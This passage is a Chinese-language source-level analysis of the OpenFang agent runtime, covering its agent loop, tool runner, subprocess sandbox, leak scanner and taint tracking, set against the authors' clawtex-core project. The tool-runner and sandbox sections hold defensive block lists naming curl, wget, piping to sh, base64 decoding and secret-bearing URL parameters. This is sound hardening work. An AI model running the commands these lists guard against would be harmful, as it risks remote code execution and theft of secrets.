# OpenFang 深度技術分析 v2

> **專案**: OpenFang v0.3.48 -- 開源 Agent 作業系統
> **倉庫**: `references/openfang/` (RightNow-AI/openfang)
> **分析日期**: 2026-03-13 (深度重寫版)
> **分析者**: clawtex-core 開發團隊
> **測試數量**: 1,744+ tests
> **授權**: Apache-2.0 OR MIT
> **分析深度**: 原始碼逐行, 含資料流圖 + 效能分析 + clawtex 差距對比

---

## 目錄

1. [14-Crate Workspace 架構](#1-14-crate-workspace-架構)
2. [Agent Loop 核心迴圈](#2-agent-loop-核心迴圈)
3. [ThinkFilter 串流狀態機](#3-thinkfilter-串流狀態機)
4. [ToolRunner 工具執行引擎](#4-toolrunner-工具執行引擎)
5. [SubprocessSandbox 環境隔離](#5-subprocesssandbox-環境隔離)
6. [ShellBleed 洩漏偵測](#6-shellbleed-洩漏偵測)
7. [Taint Tracking 汙染追蹤](#7-taint-tracking-汙染追蹤)
8. [LlmDriver Trait 與驅動器](#8-llmdriver-trait-與驅動器)
9. [Qwen Code Driver CLI 驅動](#9-qwen-code-driver-cli-驅動)
10. [FallbackDriver 鏈式降級](#10-fallbackdriver-鏈式降級)
11. [LoopGuard 迴圈偵測](#11-loopguard-迴圈偵測)
12. [Context Budget 動態預算](#12-context-budget-動態預算)
13. [Context Overflow 4 階段恢復](#13-context-overflow-4-階段恢復)
14. [MCP Client 協議實作](#14-mcp-client-協議實作)
15. [TriggerEngine 事件驅動觸發](#15-triggerengine-事件驅動觸發)
16. [EventBus 事件匯流排](#16-eventbus-事件匯流排)
17. [WorkflowEngine 工作流引擎](#17-workflowengine-工作流引擎)
18. [Supervisor 程序監督](#18-supervisor-程序監督)
19. [Capability Manager 權限管理](#19-capability-manager-權限管理)
20. [Hook Registry 生命週期鉤子](#20-hook-registry-生命週期鉤子)
21. [Audit 審計 Merkle Hash Chain](#21-audit-審計-merkle-hash-chain)
22. [Browser CDP 原生自動化](#22-browser-cdp-原生自動化)
23. [LLM Error Classifier 錯誤分類](#23-llm-error-classifier-錯誤分類)
24. [Session Repair 會話修復](#24-session-repair-會話修復)
25. [綜合差距矩陣](#25-綜合差距矩陣)
26. [優先實作路線圖](#26-優先實作路線圖)

---

## 1. 14-Crate Workspace 架構

### 1.1 Workspace 結構

**檔案**: `references/openfang/Cargo.toml`

```toml
[workspace]
resolver = "2"
members = [
    "crates/openfang-types",       # 共用型別、設定結構、事件定義
    "crates/openfang-memory",      # 記憶層 (SQLite + 向量搜尋)
    "crates/openfang-runtime",     # Agent 執行引擎 (59+ 模組)
    "crates/openfang-wire",        # OFP 網路協議 (P2P agent 通訊)
    "crates/openfang-api",         # REST API + WebSocket + Dashboard
    "crates/openfang-kernel",      # 核心 kernel (agent 生命週期管理)
    "crates/openfang-cli",         # CLI + TUI (ratatui)
    "crates/openfang-channels",    # 28 頻道 (Telegram/Discord/Slack/...)
    "crates/openfang-migrate",     # 資料遷移工具
    "crates/openfang-skills",      # 技能系統 (bundled + 自訂)
    "crates/openfang-desktop",     # Tauri 桌面應用
    "crates/openfang-hands",       # 手 (workflow 定義)
    "crates/openfang-extensions",  # 擴展管理 (安裝/OAuth/vault)
    "xtask",                       # 建構任務
]
```

### 1.2 依賴關係圖

```
                    openfang-types
                    /    |    \
                   /     |     \
         openfang-memory |  openfang-wire
              \          |         /
               \         |        /
            openfang-runtime     /
                 |      \       /
                 |       \     /
            openfang-kernel   /
               /    |    \   /
              /     |     \ /
     openfang-api  openfang-channels  openfang-skills
              \     |      /      /
               \    |     /      /
            openfang-cli + openfang-desktop
                    |
             openfang-hands
             openfang-extensions
```

### 1.3 模組化策略分析

| 面向 | OpenFang (14 crate) | clawtex-core (1 crate) |
|------|-------------------|----------------------|
| 編譯速度 | 增量編譯只重建變動 crate | 任何變動重建全部 |
| 測試隔離 | 每個 crate 獨立 `cargo test -p` | 全域測試, 可能交叉汙染 |
| 依賴粒度 | `openfang-types` 零外部依賴 | 全部模組共享 tokio/serde/etc |
| API 穩定性 | crate 邊界 = API 契約 | 模組內部無邊界 |
| 重構風險 | 改 runtime 不影響 kernel | 全域 ripple effect |
| 發佈靈活性 | 可單獨發佈 types/memory | 必須整體發佈 |
| 學習曲線 | 需理解 workspace 結構 | 單一入口, 容易上手 |
| 循環依賴防護 | crate 邊界天然防止 | 需人工維護 `pub(crate)` |

### 1.4 效能特徵

- **增量編譯**: 改動 `openfang-runtime` 僅重編 3 crate (runtime + kernel + api), 其餘不變
- **平行編譯**: 14 crate 中多個無依賴, `cargo` 自動平行
- **二進位大小**: workspace 共享依賴, 最終二進位與單 crate 差異不大

### 1.5 錯誤處理策略

OpenFang 使用 `thiserror` 在 `openfang-types` 定義統一錯誤型別:

```rust
// crates/openfang-types/src/error.rs
#[derive(Error, Debug)]
pub enum OpenFangError {
    #[error("Internal error: {0}")]
    Internal(String),
    #[error("LLM driver error: {0}")]
    LlmDriver(String),
    #[error("Memory error: {0}")]
    Memory(String),
    #[error("Max iterations exceeded: {0}")]
    MaxIterationsExceeded(u32),
    // ...
}
pub type OpenFangResult<T> = Result<T, OpenFangError>;
```

clawtex-core 使用 `anyhow::Result` 全域, 無結構化錯誤分類。

**Clawtex 實作建議**: 短期不需拆 workspace (單 crate 在 709 tests 規模仍可管理), 但應採用 `thiserror` 定義 `enum ClawtexError` 取代 `anyhow`, 使錯誤分類可 match。當 crate 超過 100 模組時再考慮拆分。優先拆出 `clawtex-types` crate 存放共用型別。

---

## 2. Agent Loop 核心迴圈

### 2.1 函式簽名

**檔案**: `crates/openfang-runtime/src/agent_loop.rs` (約 950 行)

```rust
pub async fn run_agent_loop(
    manifest: &AgentManifest,           // agent 設定清單
    user_message: &str,                 // 使用者訊息
    session: &mut Session,              // 會話歷史 (可變)
    memory: &MemorySubstrate,           // 記憶層
    driver: Arc<dyn LlmDriver>,         // LLM 驅動器
    available_tools: &[ToolDefinition], // 可用工具定義
    kernel: Option<Arc<dyn KernelHandle>>,  // kernel 控制柄
    skill_registry: Option<&SkillRegistry>, // 技能註冊表
    mcp_connections: Option<&tokio::sync::Mutex<Vec<McpConnection>>>,
    web_ctx: Option<&WebToolsContext>,      // Web 搜尋上下文
    browser_ctx: Option<&BrowserManager>,   // 瀏覽器管理器
    embedding_driver: Option<&(dyn EmbeddingDriver + Send + Sync)>,
    workspace_root: Option<&Path>,
    on_phase: Option<&PhaseCallback>,       // 生命週期回呼
    media_engine: Option<&MediaEngine>,     // 媒體理解引擎
    tts_engine: Option<&TtsEngine>,         // 語音合成
    docker_config: Option<&DockerSandboxConfig>,
    hooks: Option<&HookRegistry>,           // 鉤子註冊表
    context_window_tokens: Option<usize>,   // 上下文視窗
    process_manager: Option<&ProcessManager>,
    user_content_blocks: Option<Vec<ContentBlock>>, // 多模態內容
) -> OpenFangResult<AgentLoopResult>
```

共 22 個參數, 使用 `Option<>` 模式使每個子系統可選注入。

### 2.2 資料流

```
User Message
     |
     v
[1] Memory Recall (vector/text)
     |
     v
[2] BeforePromptBuild Hook
     |
     v
[3] Build System Prompt + Memory Section
     |
     v
[4] Session Repair (validate_and_repair)
     |
     v
[5] Canonical Context Injection
     |
     v
[6] History Trimming (MAX_HISTORY=20)
     |
     v
+-->[7] Context Overflow Recovery Pipeline (4-stage)
|        |
|        v
|   [8] Context Guard (compact oversized tool results)
|        |
|        v
|   [9] Strip Provider Prefix ("openrouter/google/gemini" -> "google/gemini")
|        |
|        v
|   [10] Build CompletionRequest
|        |
|        v
|   [11] PhaseCallback(Thinking)
|        |
|        v
|   [12] call_with_retry() -- 含 ProviderCooldown 斷路器
|        |
|        v
|   [13] Recover Text Tool Calls (<function=name> tags)
|        |
|        v
|   [14] Match StopReason:
|        |
|        +-- EndTurn --> [15] Parse Directives -> NO_REPLY check
|        |                    -> Empty guard -> Save session
|        |                    -> Remember with embedding -> Done
|        |
|        +-- ToolUse --> [16] For each tool_call:
|        |                    -> LoopGuard.check()
|        |                    -> PhaseCallback(ToolUse)
|        |                    -> BeforeToolCall Hook
|        |                    -> execute_tool() with timeout(120s)
|        |                    -> AfterToolCall Hook
|        |                    -> Dynamic truncation
|        |                    -> Approval denial guidance
|        |                    -> Error fabrication guard
|        |                    -> Interim save session
|        |                    -> Continue loop
|        |
|        +-- MaxTokens --> [17] Consecutive check (max 5)
|                               -> "Please continue" -> Continue loop
|
+---[Loop back to step 7, max 50 iterations]
```

### 2.3 關鍵常數

```rust
const MAX_ITERATIONS: u32 = 50;        // 最大迴圈次數
const MAX_RETRIES: u32 = 3;            // API 重試次數
const BASE_RETRY_DELAY_MS: u64 = 1000; // 指數退避基底
const TOOL_TIMEOUT_SECS: u64 = 120;    // 工具超時
const MAX_CONTINUATIONS: u32 = 5;      // MaxTokens 最大續接
const MAX_HISTORY_MESSAGES: usize = 20; // 歷史上限
const DEFAULT_CONTEXT_WINDOW: usize = 200_000; // 預設上下文視窗
```

### 2.4 AgentLoopResult 結構

```rust
pub struct AgentLoopResult {
    pub response: String,
    pub total_usage: TokenUsage,
    pub iterations: u32,
    pub cost_usd: Option<f64>,
    pub silent: bool,              // NO_REPLY / [[silent]] 偵測
    pub directives: ReplyDirectives, // 回覆指令 (reply_to, thread)
}
```

### 2.5 LoopPhase 生命週期

```rust
pub enum LoopPhase {
    Thinking,                    // 呼叫 LLM
    ToolUse { tool_name: String }, // 執行工具
    Streaming,                   // 串流 tokens
    Done,                        // 成功完成
    Error,                       // 錯誤
}
pub type PhaseCallback = Arc<dyn Fn(LoopPhase) + Send + Sync>;
```

### 2.6 與 clawtex-core 差距對比

| 功能 | OpenFang | clawtex-core | 差距 |
|------|----------|-------------|------|
| 迴圈上限 | 50 (可配置) | 10 (MAX_TOOL_ROUNDS) | clawtex 較保守 |
| 記憶回召 | 向量+文字雙路 | 文字搜尋 | 缺向量嵌入 |
| Session Repair | 專用模組修復孤立訊息 | 無 | 可能導致空回應 |
| Context Overflow | 4 階段漸進式恢復 | 無自動恢復 | 上下文爆炸直接失敗 |
| Hook System | BeforeToolCall 可阻擋 | 無 | 缺乏可擴展攔截點 |
| Text Tool Recovery | 偵測 `<function=name>` | 無 | Groq/Llama 的工具呼叫被忽略 |
| NO_REPLY | 支援靜默模式 | 無 | auto-reply 場景缺乏 |
| Approval Denial Guard | 偵測拒絕+注入指引 | 有 approval gate 但無 denial loop 防護 | 模型可能無限重試被拒工具 |
| Error Fabrication Guard | 強制誠實報告錯誤 | 無 | 模型可能捏造工具結果 |
| Phase Callback | 即時生命週期通知 | 無 | UI 無法知道 agent 在做什麼 |

**Clawtex 實作建議**:

1. **Session Repair** (P0): 在 `agent_runtime.rs` 的 LLM 呼叫前加入 `validate_and_repair()`, 移除孤立 ToolResult、合併連續同角色訊息:
```rust
// src/session_repair.rs (新檔案, 約 80 行)
pub fn validate_and_repair(messages: &[ChatMessage]) -> Vec<ChatMessage> {
    // 1. 移除孤立的 tool_result (沒有對應的 assistant tool_use)
    // 2. 合併連續同角色訊息
    // 3. 確保 tool_use/tool_result 配對完整
}
```

2. **Error Fabrication Guard** (P0): 在工具回傳錯誤後注入系統訊息:
```rust
// 在 agent_runtime.rs tool 執行後
if result.is_error() {
    messages.push(ChatMessage::system(
        format!("[System: Tool '{}' failed. Report error honestly, do NOT fabricate results.]", tool_name)
    ));
}
```

3. **Phase Callback** (P1): 加入 `on_phase: Option<Box<dyn Fn(AgentPhase)>>` 參數, 讓 Telegram bot 可即時顯示 "正在搜尋..." / "正在執行..."

---

## 3. ThinkFilter 串流狀態機

### 3.1 完整原始碼

**檔案**: `crates/openfang-runtime/src/think_filter.rs` (158 行 + 200 行測試)

```rust
pub enum FilterAction {
    EmitText(String),      // 可見文字
    EmitThinking(String),  // 推理文字 (不顯示給使用者)
}

pub struct StreamingThinkFilter {
    inside_think: bool,    // 是否在 <think> 區塊內
    pending: String,       // 緩衝區 (可能是標籤的部分前綴)
}

impl StreamingThinkFilter {
    pub fn process(&mut self, delta: &str) -> Vec<FilterAction> {
        self.pending.push_str(delta);
        let mut actions = Vec::new();
        loop {
            if self.inside_think {
                if let Some(end_pos) = self.pending.find("</think>") {
                    let thinking = self.pending[..end_pos].to_string();
                    if !thinking.is_empty() {
                        actions.push(FilterAction::EmitThinking(thinking));
                    }
                    self.pending = self.pending[end_pos + "</think>".len()..].to_string();
                    self.inside_think = false;
                    continue; // 可能還有更多標籤
                }
                let keep = partial_suffix_match(&self.pending, "</think>");
                let emit_len = self.pending.len() - keep;
                if emit_len > 0 {
                    actions.push(FilterAction::EmitThinking(
                        self.pending[..emit_len].to_string()
                    ));
                    self.pending = self.pending[emit_len..].to_string();
                }
                break;
            } else {
                if let Some(start_pos) = self.pending.find("<think>") {
                    let visible = self.pending[..start_pos].to_string();
                    if !visible.is_empty() {
                        actions.push(FilterAction::EmitText(visible));
                    }
                    self.pending = self.pending[start_pos + "<think>".len()..].to_string();
                    self.inside_think = true;
                    continue;
                }
                let keep = partial_suffix_match(&self.pending, "<think>");
                let emit_len = self.pending.len() - keep;
                if emit_len > 0 {
                    actions.push(FilterAction::EmitText(
                        self.pending[..emit_len].to_string()
                    ));
                    self.pending = self.pending[emit_len..].to_string();
                }
                break;
            }
        }
        actions
    }

    pub fn flush(&mut self) -> Vec<FilterAction> {
        if !self.pending.is_empty() {
            let text = std::mem::take(&mut self.pending);
            if self.inside_think {
                vec![FilterAction::EmitThinking(text)]
            } else {
                vec![FilterAction::EmitText(text)]
            }
        } else {
            vec![]
        }
    }
}

fn partial_suffix_match(haystack: &str, needle: &str) -> usize {
    let h = haystack.as_bytes();
    let n = needle.as_bytes();
    let max_len = h.len().min(n.len() - 1);
    for len in (1..=max_len).rev() {
        if h.ends_with(&n[..len]) {
            return len;
        }
    }
    0
}
```

### 3.2 狀態機圖

```
         +---------------------------+
         |    OUTSIDE_THINK          |
         |  (inside_think = false)   |
         +---------------------------+
              |                ^
  find "<think>"         find "</think>"
              |                |
              v                |
         +---------------------------+
         |    INSIDE_THINK           |
         |  (inside_think = true)    |
         +---------------------------+

         在兩個狀態中都有:
         - partial_suffix_match 保留可能是標籤前綴的尾部
         - 確定不是標籤的部分立即 emit
```

### 3.3 與 clawtex ThinkFilter 逐行對比

**clawtex 版本**: `src/think_filter.rs` (252 行, 含測試)

| 面向 | OpenFang `StreamingThinkFilter` | clawtex `ThinkFilter` |
|------|-------------------------------|----------------------|
| **輸出型別** | `Vec<FilterAction>` (區分 Text/Thinking) | `String` (只回傳可見文字) |
| **Thinking 保留** | 作為 `EmitThinking` 傳遞, 可記錄/顯示 | 直接丟棄, 無法取回 |
| **partial tag 處理** | `partial_suffix_match()` 精確計算 | 固定保留最後 7/8 字元 |
| **批次模式** | 無 (串流專用) | 有 `strip_think_tags()` regex 版 |
| **大小寫** | 僅支援小寫 `<think>` | regex 支援 `(?si)` 大小寫不敏感 |
| **多 block** | 同一 delta 可處理多個 `<think>...<think>` 交替 | 同 |
| **flush 策略** | inside_think 時 emit 為 Thinking | inside_think 時丟棄 |
| **效能** | `String::find()` + 手動切片, 零 regex | 串流: 手動; 批次: regex |

clawtex 的 `partial_suffix_match` 是硬編碼的 7/8 字元保留:
```rust
// clawtex src/think_filter.rs:79
if self.buffer.len() > 8 {
    self.buffer = self.buffer[self.buffer.len() - 8..].to_string();
}
```

OpenFang 的 `partial_suffix_match` 是精確計算:
```rust
// openfang: 逐長度檢查 haystack 尾部是否匹配 needle 前綴
for len in (1..=max_len).rev() {
    if h.ends_with(&n[..len]) {
        return len;
    }
}
```

### 3.4 效能特徵

- **零正則表達式**: OpenFang 的串流版完全不用 regex, 只用 `String::find()` 和 byte 比較
- **最小緩衝**: `pending` 只保留 0-7 bytes (partial tag 長度), 不累積大量資料
- **O(n) 複雜度**: 每個 delta 只掃描一次, 不回溯
- **記憶體**: 只有 `pending: String` 和 `inside_think: bool`, 約 32 bytes

**Clawtex 實作建議**:

1. **加入 `FilterAction` enum**: 保留 thinking content 而非丟棄, 可用於:
   - 除錯介面顯示推理過程
   - 成本追蹤 (thinking tokens 計入)
   - Telegram 的 "spoiler" 格式顯示推理

2. **精確 partial_suffix_match**: 取代硬編碼的 7/8 字元保留:
```rust
// src/think_filter.rs 改進
fn partial_suffix_match(haystack: &str, needle: &str) -> usize {
    let h = haystack.as_bytes();
    let n = needle.as_bytes();
    let max_len = h.len().min(n.len().saturating_sub(1));
    for len in (1..=max_len).rev() {
        if h.ends_with(&n[..len]) {
            return len;
        }
    }
    0
}
```

3. **大小寫支援**: OpenFang 只支援小寫, clawtex 的 regex 版支援大小寫, 這是 clawtex 的優勢, 保留。

---

## 4. ToolRunner 工具執行引擎

### 4.1 核心函式

**檔案**: `crates/openfang-runtime/src/tool_runner.rs` (約 800 行)

```rust
pub async fn execute_tool(
    tool_use_id: &str,
    tool_name: &str,
    input: &serde_json::Value,
    kernel: Option<&Arc<dyn KernelHandle>>,
    allowed_tools: Option<&[String]>,       // 能力清單
    caller_agent_id: Option<&str>,
    skill_registry: Option<&SkillRegistry>,
    mcp_connections: Option<&tokio::sync::Mutex<Vec<McpConnection>>>,
    web_ctx: Option<&WebToolsContext>,
    browser_ctx: Option<&BrowserManager>,
    allowed_env_vars: Option<&[String]>,
    workspace_root: Option<&Path>,
    media_engine: Option<&MediaEngine>,
    exec_policy: Option<&ExecPolicy>,       // 執行策略
    tts_engine: Option<&TtsEngine>,
    docker_config: Option<&DockerSandboxConfig>,
    process_manager: Option<&ProcessManager>,
) -> ToolResult
```

### 4.2 安全多層防線

```
Tool Call 進入
     |
     v
[Layer 1] normalize_tool_name() -- 別名解析 ("fs-write" -> "file_write")
     |
     v
[Layer 2] Capability Enforcement -- 白名單檢查 (allowed_tools)
     |
     v
[Layer 3] Approval Gate -- 人工審核 (requires_approval)
     |
     v
[Layer 4] Per-Tool Security:
     |
     +-- shell_exec:
     |     [4a] contains_shell_metacharacters() -- 阻擋 `;|&$()><{}`
     |     [4b] validate_command_allowlist() -- Deny/Allowlist/Full 模式
     |     [4c] check_taint_shell_exec() -- 啟發式汙染檢查
     |
     +-- web_fetch:
     |     [4d] check_taint_net_fetch() -- 阻擋 URL 含 api_key/token
     |
     +-- MCP tools:
     |     [4e] namespace 解析 (mcp_{server}_{tool})
     |
     v
[Layer 5] Tool Execution (具體工具邏輯)
     |
     v
ToolResult
```

### 4.3 Taint Tracking 實作

```rust
// tool_runner.rs - Shell Taint Check
fn check_taint_shell_exec(command: &str) -> Option<String> {
    // Layer 1: Shell metacharacters
    if let Some(reason) = subprocess_sandbox::contains_shell_metacharacters(command) {
        return Some(format!("Shell metacharacter injection blocked: {reason}"));
    }
    // Layer 2: Heuristic patterns
    let suspicious = ["curl ", "wget ", "| sh", "| bash", "base64 -d", "eval "];
    for pattern in &suspicious {
        if command.contains(pattern) {
            let mut labels = HashSet::new();
            labels.insert(TaintLabel::ExternalNetwork);
            let tainted = TaintedValue::new(command, labels, "llm_tool_call");
            if let Err(violation) = tainted.check_sink(&TaintSink::shell_exec()) {
                return Some(violation.to_string());
            }
        }
    }
    None
}

// Net Fetch Taint Check
fn check_taint_net_fetch(url: &str) -> Option<String> {
    let exfil_patterns = ["api_key=", "token=", "secret=", "password="];
    for pattern in &exfil_patterns {
        if url.to_lowercase().contains(&pattern.to_lowercase()) {
            let tainted = TaintedValue::new(url, labels, "llm_tool_call");
            if let Err(v) = tainted.check_sink(&TaintSink::net_fetch()) {
                return Some(v.to_string());
            }
        }
    }
    None
}
```

### 4.4 Inter-Agent Call Depth 追蹤

```rust
tokio::task_local! {
    static AGENT_CALL_DEPTH: std::cell::Cell<u32>;
}
const MAX_AGENT_CALL_DEPTH: u32 = 5;

// 防止 agent A -> agent B -> agent C -> ... 無限遞迴
pub fn current_agent_depth() -> u32 {
    AGENT_CALL_DEPTH.try_with(|d| d.get()).unwrap_or(0)
}
```

### 4.5 與 clawtex-core 差距

| 功能 | OpenFang | clawtex-core | 差距 |
|------|----------|-------------|------|
| Tool Name 正規化 | `normalize_tool_name()` | 無 | LLM 幻覺名稱無法解析 |
| 能力白名單 | `allowed_tools` 參數 | 無 | 任何 agent 可呼叫任何 tool |
| Taint Tracking | `TaintedValue` + `TaintSink` | 無 | 資料外洩風險 |
| Exec Policy | Deny/Allowlist/Full 三模式 | shell allowlist (固定清單) | 缺乏模式切換 |
| Agent Depth | task_local 追蹤, 上限 5 | 無 | delegate 工具可能無限遞迴 |
| Docker Sandbox | Docker 容器執行 | 無 | 高危命令無隔離 |

**Clawtex 實作建議**:

1. **Tool Name 正規化** (P0, 30 分鐘):
```rust
// src/tools/mod.rs
pub fn normalize_tool_name(name: &str) -> &str {
    match name {
        "fs-write" | "file-write" | "write_file" => "file_write",
        "fs-read" | "file-read" | "read_file" => "file_read",
        "bash" | "terminal" | "run" | "exec" => "shell",
        "search" | "google" | "web-search" => "web_search",
        _ => name,
    }
}
```

2. **Agent Depth Guard** (P1, 1 小時): 在 delegate tool 加入深度計數器, 防止 A->B->C->A 無限迴圈。

3. **Taint Check for URLs** (P1, 30 分鐘): 在 `http_request` 工具中檢查 URL 是否包含 `api_key=` 等敏感模式。

---

## 5. SubprocessSandbox 環境隔離

### 5.1 完整原始碼

**檔案**: `crates/openfang-runtime/src/subprocess_sandbox.rs` (約 350 行)

```rust
/// 所有平台都安全的環境變數
pub const SAFE_ENV_VARS: &[&str] = &[
    "PATH", "HOME", "TMPDIR", "TMP", "TEMP", "LANG", "LC_ALL", "TERM",
];

/// Windows 額外安全變數
#[cfg(windows)]
pub const SAFE_ENV_VARS_WINDOWS: &[&str] = &[
    "USERPROFILE", "SYSTEMROOT", "APPDATA", "LOCALAPPDATA",
    "COMSPEC", "WINDIR", "PATHEXT",
];

pub fn sandbox_command(cmd: &mut tokio::process::Command, allowed_env_vars: &[String]) {
    cmd.env_clear();                    // 先清除所有環境變數

    for var in SAFE_ENV_VARS {          // 恢復安全變數
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    #[cfg(windows)]
    for var in SAFE_ENV_VARS_WINDOWS {  // Windows 額外變數
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    for var in allowed_env_vars {       // 呼叫者允許的額外變數
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }
}
```

### 5.2 Shell Metacharacter 阻擋

```rust
pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
    if command.contains('`')  { return Some("backtick command substitution".into()); }
    if command.contains("$(") { return Some("$() command substitution".into()); }
    if command.contains("${") { return Some("${} variable expansion".into()); }
    if command.contains(';')  { return Some("semicolon command chaining".into()); }
    if command.contains('|')  { return Some("pipe operator".into()); }
    if command.contains('>')  { return Some("I/O redirection".into()); }
    if command.contains('<')  { return Some("I/O redirection".into()); }
    if command.contains('{')  { return Some("brace expansion".into()); }
    if command.contains('}')  { return Some("brace expansion".into()); }
    if command.contains('\n') { return Some("embedded newline".into()); }
    if command.contains('\r') { return Some("embedded newline".into()); }
    if command.contains('\0') { return Some("null byte".into()); }
    if command.contains('&')  { return Some("ampersand operator".into()); }
    None
}
```

### 5.3 Exec Policy 三模式

```rust
pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<(), String> {
    match policy.mode {
        ExecSecurityMode::Deny => Err("Shell execution disabled"),
        ExecSecurityMode::Full => Ok(()), // 無限制 (警告 log)
        ExecSecurityMode::Allowlist => {
            // 先檢查 metacharacters
            if let Some(reason) = contains_shell_metacharacters(command) {
                return Err(reason);
            }
            // 提取所有子命令, 逐一檢查白名單
            let commands = extract_all_commands(command);
            for base in &commands {
                if !policy.safe_bins.contains(base)
                    && !policy.allowed_commands.contains(base) {
                    return Err(format!("'{}' not in allowlist", base));
                }
            }
            Ok(())
        }
    }
}
```

### 5.4 Process Tree Kill

```rust
pub async fn kill_process_tree(pid: u32, grace_ms: u64) -> Result<bool, String> {
    // Unix: kill -TERM -PID (process group) -> wait -> kill -KILL -PID
    // Windows: taskkill /PID -> wait -> taskkill /F /PID
}
```

### 5.5 與 clawtex safe_subprocess_env() 對比

**clawtex 版本**: `src/providers/chatgpt_backend.rs`

```rust
fn safe_subprocess_env() -> Vec<(String, String)> {
    let sensitive_prefixes = [
        "ANTHROPIC_", "OPENAI_", "GEMINI_", "GROQ_", "DEEPSEEK_",
        "MISTRAL_", "TOGETHER_", "FIREWORKS_", ...
    ];
    std::env::vars()
        .filter(|(k, _)| !sensitive_prefixes.iter().any(|p| k.starts_with(p)))
        .filter(|(k, _)| !k.ends_with("_KEY") && !k.ends_with("_SECRET") && ...)
        .collect()
}
```

| 面向 | OpenFang | clawtex-core | 差距 |
|------|----------|-------------|------|
| **策略** | Allowlist: 先清空, 再加安全的 | Denylist: 保留所有, 移除危險的 | clawtex 可能遺漏新密鑰 |
| **適用範圍** | shell_exec + MCP + all subprocess | 僅 chatgpt_backend | shell tool 沒有 env 隔離 |
| **Windows 支援** | `#[cfg(windows)]` 額外 7 變數 | 無平台區分 | Windows 可能缺少必要變數 |
| **動態白名單** | `allowed_env_vars` 參數 (hand 可配置) | 固定邏輯 | 無法按 hand 自訂 |
| **Metacharacter** | 13 種字元阻擋 | 只有 allowlist 白名單 | 缺乏注入防護層 |
| **Process Kill** | 跨平台 process tree kill | 無 | 超時程序可能殘留 |

**Clawtex 實作建議**:

1. **策略反轉為 Allowlist** (P0): 將 shell tool 改為 `env_clear()` + 恢復安全變數:
```rust
// src/tools/shell.rs 改進
fn sandbox_env(cmd: &mut tokio::process::Command) {
    cmd.env_clear();
    for var in &["PATH", "HOME", "TMPDIR", "TEMP", "LANG", "TERM"] {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }
    #[cfg(windows)]
    for var in &["USERPROFILE", "SYSTEMROOT", "APPDATA", "LOCALAPPDATA", "COMSPEC", "WINDIR"] {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }
}
```

2. **Metacharacter 檢查** (P0): 在 shell tool 執行前加入:
```rust
fn contains_shell_metacharacters(cmd: &str) -> Option<&'static str> {
    if cmd.contains('`')  { return Some("backtick"); }
    if cmd.contains("$(") { return Some("command substitution"); }
    if cmd.contains(';')  { return Some("semicolon"); }
    if cmd.contains('|')  { return Some("pipe"); }
    if cmd.contains('&')  { return Some("ampersand"); }
    None
}
```

---

## 6. ShellBleed 洩漏偵測

### 6.1 完整原始碼概要

**檔案**: `crates/openfang-runtime/src/shell_bleed.rs` (355 行)

這是 **clawtex 完全沒有的功能**。當 agent 執行 `python3 script.py` 或 `bash run.sh` 時, 腳本內可能引用了環境變數中的密鑰。ShellBleed 在執行前掃描腳本檔案, 發出警告。

### 6.2 資料流

```
shell_exec("python3 deploy.py")
     |
     v
extract_script_path() --> "deploy.py"
     |
     v
讀取 deploy.py 內容 (上限 100KB)
     |
     v
逐行掃描:
  [跳過] # 開頭的註解行
  [掃描] $VAR_NAME, ${VAR}, os.environ["VAR"],
         os.getenv("VAR"), process.env.VAR
     |
     v
過濾安全變數 (PATH, HOME, TMPDIR, ...)
     |
     v
檢查可疑模式: 包含 "key", "secret", "token",
              "password", "credential", "auth"
     |
     v
[SHELL BLEED WARNING] deploy.py (line 5): $OPENAI_API_KEY
  -- Consider passing as tool parameter instead.
```

### 6.3 多語言支援

```rust
fn extract_env_var_refs(line: &str) -> Vec<String> {
    // Shell/Bash: $VAR_NAME, ${VAR_NAME}
    // Python: os.environ["VAR"], os.getenv("VAR")
    // Node.js: process.env.VAR
}
```

支援 7 種腳本副檔名: `.py, .sh, .bash, .rb, .pl, .js, .ts, .ps1`

### 6.4 安全白名單

```rust
const SAFE_VARS: &[&str] = &[
    "PATH", "HOME", "TMPDIR", "TMP", "TEMP", "LANG", "LC_ALL", "TERM",
    "USER", "LOGNAME", "SHELL", "PWD", "OLDPWD", "HOSTNAME", "DISPLAY",
    "PYTHONPATH", "NODE_PATH", "GOPATH", "CARGO_HOME", "RUSTUP_HOME",
    "VIRTUAL_ENV", "CONDA_DEFAULT_ENV", "PYTHONUNBUFFERED",
    "CI", "GITHUB_ACTIONS", "GITHUB_WORKSPACE", "GITHUB_SHA",
    // + Windows 變數
];
```

### 6.5 錯誤處理策略

- 腳本不存在: 靜默返回空警告 (不阻擋執行)
- 腳本太大 (>100KB): 靜默跳過 (避免 DoS)
- 非腳本命令 (`ls -la`): `extract_script_path` 返回 None, 跳過
- 警告僅作為 tool result 前綴, **不阻擋執行**

### 6.6 效能特徵

- 同步 `std::fs::read_to_string`: 在 async 上下文中阻塞, 但腳本通常很小 (<100KB)
- 逐行掃描, 正則表達式零使用
- 白名單為 `&[&str]` 常數, 編譯期確定

**Clawtex 實作建議** (P1, 約 2 小時):

建立 `src/tools/shell_bleed.rs`:
```rust
pub struct ShellBleedWarning {
    pub file: PathBuf,
    pub line_number: usize,
    pub pattern: String,
    pub suggestion: String,
}

pub fn scan_script_for_bleed(command: &str, workspace: Option<&Path>) -> Vec<ShellBleedWarning> {
    // 1. 從命令中提取腳本路徑
    // 2. 讀取腳本 (上限 100KB)
    // 3. 逐行掃描 $VAR, os.environ, process.env
    // 4. 過濾安全白名單
    // 5. 標記含 "key"/"secret"/"token" 的變數
}
```

在 `src/tools/shell.rs` 的 execute 前呼叫:
```rust
let warnings = shell_bleed::scan_script_for_bleed(&command, workspace_root);
if !warnings.is_empty() {
    let warning_text = shell_bleed::format_warnings(&warnings);
    // 將 warning_text 前綴到 tool result
}
```

---

## 7. Taint Tracking 汙染追蹤

### 7.1 架構

OpenFang 在 `openfang-types` 定義了完整的汙染追蹤型別:

```rust
// openfang-types/src/taint.rs
pub enum TaintLabel {
    ExternalNetwork,  // 來自外部網路的資料
    UserInput,        // 使用者輸入
    Secret,           // 密鑰/敏感資料
}

pub struct TaintedValue {
    pub value: String,
    pub labels: HashSet<TaintLabel>,
